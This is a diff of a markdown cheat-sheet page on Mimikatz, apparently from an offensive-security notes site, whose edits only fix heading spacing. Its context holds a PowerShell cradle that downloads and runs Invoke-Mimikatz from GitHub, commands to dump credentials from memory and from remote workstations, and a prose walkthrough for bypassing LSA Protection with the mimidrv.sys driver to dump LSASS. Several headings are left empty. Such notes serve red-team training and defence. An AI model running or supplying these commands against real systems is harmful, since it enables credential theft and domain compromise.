@@ -1,13 +1,13 @@
 # Mimikatz
 
 URL: [https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1](https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1)
-###Dump Credentials
+### Dump Credentials
 
 ```
 # Download and execute in cradle
 IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')
 
-#Dump creds from memory
+# Dump creds from memory
 Invoke-Mimikatz -DumpCreds
 
 # DCSync Attack
@@ -23,15 +23,15 @@ Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
 Invoke-Mimikatz -DumpCreds -ComputerName @("WS01","WS02")
 ```
 
-###Dump Domain Credentials
+### Dump Domain Credentials
 
-###Spawn PowerShell (with compromised NTLM hash)
+### Spawn PowerShell (with compromised NTLM hash)
 
-###Forge Inter-domain trust ticket
+### Forge Inter-domain trust ticket
 
-###Over pass the hash
+### Over pass the hash
 
-##Protection Bypass
+## Protection Bypass
 The below image represents an attempt to access the lsass.exe process and extract clear text passwords and run a skeleton key attack. As we can see this has not been successful since applying the registry key change mentioned in the mitigation section for LSA Protection.![](../../~gitbook/image.md)We can check if the LSA Protection RunAsPPL key exists by querying the registry to confirm the LSA protection is in place.This can be bypassed by utilizing the `mimidrv.sys` driver file which is included as a separate file with mimikatz.circle-infoThe mimidrv.sys driver file needs to exists in the same directory as mimikatz.exe.The driver can be loaded by running the command `!+` in `Mimikatz`. After doing so the following command can be execute to protect the `mimikatz.exe` process.The same command with the `/remove` flag can be used to strip the process protection from a process such as `lsass.exe`From here we should be free to perform actions against LSASS and dump credentials from it.Last updated 10 months ago- [Dump Credentials](#dump-credentials)
 - [Dump Domain Credentials](#dump-domain-credentials)
 - [Spawn PowerShell (with compromised NTLM hash)](#spawn-powershell-with-compromised-ntlm-hash)
